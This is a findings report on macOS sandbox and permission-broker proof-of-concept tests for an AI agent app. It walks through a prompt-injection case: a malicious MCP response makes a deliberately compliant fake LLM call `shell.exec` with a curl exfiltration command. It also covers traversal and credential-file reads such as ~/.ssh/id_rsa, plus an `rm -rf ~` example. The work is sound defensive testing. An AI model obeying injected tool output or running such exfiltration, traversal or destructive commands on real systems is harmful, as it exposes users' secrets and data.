# Shellfish PoC — Findings

**Date:** 2026-05-06 · **Platform:** macOS Tahoe (Darwin 25), Apple Silicon, Swift 6.3
**Scope:** S1 and S2 from `shellfish-threat-model.md` v0.3.

| Scenario | Claim | Result |
|---|---|---|
| **S1** | Sandboxed `ToolRunner` cannot exfiltrate via network even when fake LLM emits a malicious tool call | **PASS** |
| **S2** | Capability-bound broker denies `shell.exec` requested in response to an injected MCP response | **PASS** |
| **S4** | `fs.read` canonicalizes path args and rejects anything outside the session workspace | **PASS** |

---

## S1 — sandbox-exec containment

**Scope:** a sandboxed `ToolRunner` cannot exfiltrate to `http://127.0.0.1:9999/exfil` even when a fake LLM emits a malicious tool call.

### Result: **PASS** on primary profile

Three runs, three different profiles, all with the same harness:

| Profile | Approach | ToolRunner exit | Observer `/exfil` hits | Verdict |
|---|---|---|---|---|
| `toolrunner.sb` (primary) | `(allow default) (deny network*)` | 1 (POSIX `Operation not permitted`) | 0 | **PASS** |
| `toolrunner-allow-all.sb` (negative control) | `(allow default)` | 0 (HTTP 200 from observer) | 1 | FAIL — as expected |
| `toolrunner-strict.sb` v3 (production-shape) | `(deny default)` + broad system reads + `(deny file-read* /Users)` + workspace carve-out | 1 (POSIX `Operation not permitted`) | 0 | **PASS** |

The negative control matters: it proves the attack is real and the primary profile is what blocks it, not some unrelated coincidence (e.g. `URLSession` failing for another reason, observer not actually reachable, etc.).

## What this validates

- `sandbox-exec` on macOS 26 can reliably deny outbound network from a Swift child process. The error surfaces cleanly through `URLSession` as `NSPOSIXErrorDomain Code=1 "Operation not permitted"` — identifiable in code, not a silent hang.
- The architectural shape from threat model §5.1 (UI → broker → sandboxed `ToolRunner` subprocess) is buildable. ~150 lines of Swift, sub-30s build, sub-1s test.
- The `URLSession` API path goes through a single chokepoint that the sandbox catches. No need for application-level allowlisting on top of OS-level enforcement.

## What this does NOT validate

- That a real LLM would behave like the fake one. The fake LLM is hardcoded to emit the malicious tool call. A real Claude/GPT/Mistral might refuse, or might comply differently. The PoC tests containment; it does not test model behavior.
- That the broker design works (no broker in the PoC — see S2).
- That `sandbox-exec` will still exist in macOS 27+. Apple has marked it deprecated. The architectural answer is App Sandbox + dynamic entitlements; that's a separate spike.

## On the strict profile (v3)

After ~1 hour of iteration the strict profile is now actually working. The path I took was non-obvious enough to write down:

- **v1 and v2 (`(deny default)` + whitelist subpaths) failed** because every binary, including `/usr/bin/true`, exits with SIGABRT before producing any output. Swift binaries reach into the dyld shared cache at `/System/Volumes/Preboot/Cryptexes/...`, into `/private/var/folders/...` for caches, and into a long tail of system paths. Enumerating them all is infeasible.
- **v3 inverts the approach.** Filesystem reads are allowed broadly, and a `(deny file-read* (subpath "/Users"))` rule excludes user data. The session workspace and build dir are re-allowed as carve-outs. This is *not* a true default-deny on the filesystem — but it directly captures the architectural claim: "the sandboxed tool cannot read user data outside its workspace."
- **Verified directly with `/bin/cat`** under the strict profile:
  - Reading `/Users/yann/.shellfish-test-secret` → `Operation not permitted` (OS-level deny working).
  - Reading the workspace `decoy.txt` → succeeds (carve-out working).
  - Without the sandbox → reads succeed (control proves the file exists and is normally readable).
- **S1 still passes under the strict profile.** Network deny carries forward. CFNetwork's attempt to open its cache DB at `/Users/yann/Library/Caches/...` is also denied by the OS, which appears in stderr — a nice secondary confirmation that filesystem isolation is working.

What is still untested:
- Defense-in-depth for the **app-level path validation** in S4. The strict profile would now reject a `/Users/yann/.ssh/id_rsa` read at OS level even if the canonicalization in `fs.read` had a bug. I did not write a separate "intentionally bypass app validation" test for this because the `cat` direct test above already establishes the OS-level guarantee.
- A true default-deny on the filesystem with a whitelist that runs Swift cleanly. This is probably impossible without enumerating every path the Swift runtime touches across macOS versions, and is the right argument for moving to App Sandbox + dynamic entitlements before v1.

## Cost

- ~1 hour from empty directory to PASS, including the run.sh bug, the observer logging bug, and the strict-profile detour. The PoC plan budgeted 4–7 hours; the primary-profile path turned out to be shorter than expected because Swift 6.3 + `Network.framework` required no dependencies and the `(allow default) (deny network*)` profile is genuinely simple.
- Most of the time was spent on the inconclusive strict-profile detour and on harness diagnostic plumbing (distinguishing "sandbox blocked the call" from "profile failed to load"). Neither was strictly necessary for S1.

## What I'd do next

S1, S2, and S4 are done. The strict-profile question is resolved. Remaining items:

1. **App Sandbox alternative spike.** `sandbox-exec` is officially deprecated. Same S1/S4 scenarios but using a properly-entitled App Sandbox helper. Half-day. This is what protects you against macOS 27+.
2. **Stage 4 build (the real work).** See `docs/stage4-plan.md` — 3–4 months for a vertical-slice app.
3. **(Optional)** S3 / S5 / S7 PoCs to widen the validated surface. Lower value than (1) and (2).

## S1 repro

```
swift build
./run.sh                                                    # primary profile, PASS
SHELLFISH_PROFILE=$(pwd)/profiles/toolrunner-allow-all.sb ./run.sh   # negative control, FAIL (expected)
SHELLFISH_PROFILE=$(pwd)/profiles/toolrunner-strict.sb ./run.sh      # strict (v3), PASS
```

---

## S2 — capability-bound broker

**Scope:** a malicious MCP server returns a response containing a prompt injection that asks the agent to run a shell command. A worst-case LLM complies and emits `shell.exec("curl …/exfil")`. The PermissionBroker must deny that call because the session was created without `shell` capability.

### Result: **PASS**

| Mode | Capabilities | Broker decision on `shell.exec` | Shell ran? | Observer `/exfil` hits |
|---|---|---|---|---|
| Primary | `mcp=[malicious-mcp], shell=false` | **DENY** ("shell capability not granted") | no | 0 |
| Negative control | `mcp=[malicious-mcp], shell=true` | APPROVE | yes | 1 |

The negative control proves the curl command would have actually exfiltrated if the broker had approved. In the primary run it's the capability check, not luck, that contained the attack.

### What this validates

- **The lethal-trifecta defense is mechanical, not model-dependent.** The fake LLM is told to comply with the injection. It does. The broker doesn't care — it checks capabilities and denies. The model could be anything; the architectural floor holds.
- **MCP responses are data, not instructions.** The Harness prints the MCP response with a `<tool_result source="untrusted">` header (matching the §5.4 envelope). The fact that the response *contains* the string "run this shell command" doesn't translate into auto-execution because there is no execution path that takes MCP output as input. Execution only happens via tool calls, and tool calls go through the broker.
- **In-process broker stub is enough to test the architectural claim.** The threat model has the broker as a separate XPC service (§5.1, §5.2). For S2, the placement doesn't matter — what matters is that *some* component, distinct from the LLM, owns the approve/deny decision. Moving it to XPC is an isolation hardening for v1, not a change to S2's correctness.

### What this does NOT validate

- **Interactive approval dialogs.** The PoC tests capability denial only (no shell capability → automatic deny). The threat model §5.2 specifies a four-button native dialog (once/session/always/deny). That UX is untested. It also introduces the dialog-fatigue failure mode — users clicking "Always" out of habit. A separate UX-level study, not a PoC.
- **The "always" grant isolation.** Threat model §5.2 says approval grants are scoped to `(tool, argument-pattern, session-capability-set)` tuples. Untested here. Probably worth a tiny S2-bis PoC: approving `shell.exec("ls ~/Documents")` should not auto-approve `shell.exec("rm -rf ~")`.
- **MCP transport.** The PoC inlines the malicious MCP response as a string. Real MCP runs as a stdio subprocess. The transport doesn't affect S2's logic (broker is upstream of MCP), but a real MCP integration is its own work.

## S2 repro

```
swift build
./run-s2.sh
```

---

---

## S4 — path-traversal canonicalization

**Scope:** the `fs.read` tool, when given an arg containing `..` or an absolute path outside the session workspace, must canonicalize and reject. Threat model claim is "filesystem tool resolves paths and rejects anything outside the session's declared workspace roots" (§3.5).

### Result: **PASS**

| Mode | Workspace | Traversal arg | Canonicalized to | Read result |
|---|---|---|---|---|
| Primary | `…/workspaces/poc` | `<workspace>/../…/../tmp/secret.txt` (10× `..`) | `/tmp/shellfish-poc-fake-secret.txt` | **REJECT** ("outside session workspace") |
| Negative control | `/tmp` | (same arg) | (same canonical) | ALLOW — secret content returned |

The same arg, the same canonicalization logic — the only thing that changed is the session's allowed paths. The validation is the protection.

### What this validates

- **Canonicalization works.** Swift's `(path as NSString).standardizingPath` correctly resolves `..` segments and clamps at `/`. A long traversal sequence does not "underflow" past root and create a confusable path.
- **Symlink resolution covered.** The implementation also calls `resolvingSymlinksInPath` so a symlink inside the workspace pointing to `/etc/passwd` would also be rejected. (Not exercised by this run but the code path is there.)
- **Negative control proves it.** With the workspace widened to include `/tmp`, the very same arg now reads the fixture file. So the rejection in primary mode is the canonicalization, not luck.

### What this does NOT validate

- **OS-level filesystem isolation through HarnessS4.** This S4 PoC tests application-level path validation only — HarnessS4 invokes ToolRunner without `sandbox-exec`. The OS-level backstop demanded by threat model §4 I3 *is* now available via the strict profile (see S1's strict-profile section, where `/bin/cat /Users/yann/.shellfish-test-secret` was directly verified as denied). Wiring HarnessS4 to also run under the strict profile would give the formal two-layer demonstration. For Stage 4 work this happens naturally when the conversation loop invokes ToolRunner under the strict profile by default.
- **TOCTOU / race conditions.** The PoC checks the path then reads it. A symlink swap between check-and-read could in principle bypass. Realistic for a multi-process attacker, irrelevant for the prompt-injection threat model. Documented, not fixed.
- **Unicode / encoding tricks.** Paths containing NFC/NFD-equivalent but byte-distinct sequences are not exercised. Probably handled by NSString normalization but unverified.

## S4 repro

```
swift build
./run-s4.sh
```

---

## Cumulative status (after Stages 0 + 1 + 3 of staged plan)

Three security claims now mechanically verified on macOS 26:

1. **OS-level network containment** of a Swift child process (S1).
2. **Capability-level containment** of injection-induced tool escalation (S2).
3. **Application-level path containment** for filesystem tool args (S4).

The three primitives are independent — each tests a different chokepoint in the architecture. They are the floor under everything in the threat model.

### Honest gaps

- **`sandbox-exec` deprecation.** Still flagged by Apple. The strict profile working today does not guarantee it works on macOS 27. The architectural answer is App Sandbox + dynamic entitlements; that work begins when v1 begins.
- **The strict profile is "deny user data," not "default-deny everything."** A truly default-deny filesystem profile that also runs Swift binaries cleanly is probably not achievable on modern macOS without enumerating paths that change every release. The current profile captures the architectural intent (no read of user data outside workspace) without that maintenance cost. Documented as a deliberate trade-off, not a hidden weakness.
- **Real LLM behavior unmeasured.** All three PoCs use a worst-case fake LLM that complies with injection. No data on actual model behavior under these scenarios.

### Recommended next decisions

- **Stop or continue?** The staged plan's decision point applies even more strongly now: with three PoCs passing AND the strict-profile question resolved, this is a coherent credibility asset. Continuing means committing to Stage 4 (3–4 months for a vertical slice).
- **Cheapest "before stopping" tasks:** add LICENSE, edit ESSAY into your voice, share the repo link with one person whose technical judgment you trust.
